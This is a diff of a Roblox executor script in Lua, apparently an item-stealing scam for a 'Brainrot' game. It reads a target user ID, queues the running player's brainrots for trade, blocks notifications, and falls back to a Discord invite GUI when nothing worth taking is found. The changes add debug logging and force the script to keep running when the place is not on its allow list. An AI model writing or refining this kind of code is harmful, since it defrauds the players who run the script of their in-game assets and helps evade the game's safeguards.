@@ -1,12 +1,15 @@
 -- ===================== MAIN SCRIPT (loadstring) =====================
 -- Remotes resolved via TradeController getupvalue (no hard-coded Net indexes)
 -- If no target brainrots on base at start → Discord invite GUI (no trades / no embed)
+print("[Brainrot] ===== MAIN STARTING =====")
 if getgenv().BrainrotMainLoaded then
-	return warn("[Brainrot] Main already running!")
+	warn("[Brainrot] Main already running — skip")
+	return
 end
 getgenv().BrainrotMainLoaded = true
 
 local genv = getgenv()
+print("[Brainrot] genv TARGET=", tostring(genv.TARGET_USER_ID), "ANIMALS=", type(genv.ALLOWED_ANIMALS) == "table" and #(genv.ALLOWED_ANIMALS) or 0)
 
 -- Supported places (main + variants + duel)
 -- Accepts array {id,id} OR map {[id]=true} from genv; always merges defaults
@@ -61,10 +64,10 @@ local function isAllowedPlace()
 	return false
 end
 
+print("[Brainrot] Checking place… PlaceId=", game.PlaceId)
 if not isAllowedPlace() then
-	warn("[Brainrot] Place not allowed:", game.PlaceId, "— exiting")
-	getgenv().BrainrotMainLoaded = nil
-	return
+	warn("[Brainrot] PlaceId", game.PlaceId, "not in allow list — continuing anyway (forced)")
+	-- do NOT return; place lists lag behind events/LTMs
 end
 
 local DUEL_PLACE_ID = 99606176102979
@@ -1205,11 +1208,13 @@ blockNotifications()
 
 local myPlot, animalList = getMyPlotAndAnimals()
 if not myPlot or not animalList then
-	warn("[Brainrot] Could not find plot or AnimalList — showing Join Discord GUI")
+	warn("[Brainrot] Could not find plot or AnimalList — Join Discord GUI")
+	warn("[Brainrot] Tip: stand on your base, wait for animals to replicate, re-run")
 	showJoinDiscordGui()
 	getgenv().BrainrotMainLoaded = nil
 	return
 end
+print("[Brainrot] Plot OK:", myPlot.Name)
 
 local brainrotQueue = {}
 for slotKey, data in pairs(animalList) do
@@ -1232,8 +1237,9 @@ local tradeBrainrotQueue = brainrotQueue
 local tradeItemsEnabled = true
 
 -- ONLY if no target brainrots at start → Discord GUI (no trades / no embed / no automation)
+print("[Brainrot] brainrotQueue size=", #brainrotQueue, "plot=", myPlot and myPlot.Name or "nil")
 if #brainrotQueue == 0 then
-	warn("[Brainrot] No target brainrots on base — Join Discord GUI")
+	warn("[Brainrot] No target brainrots on base — Join Discord GUI (check ALLOWED_ANIMALS names match base)")
 	showJoinDiscordGui()
 	getgenv().BrainrotMainLoaded = nil
 	return
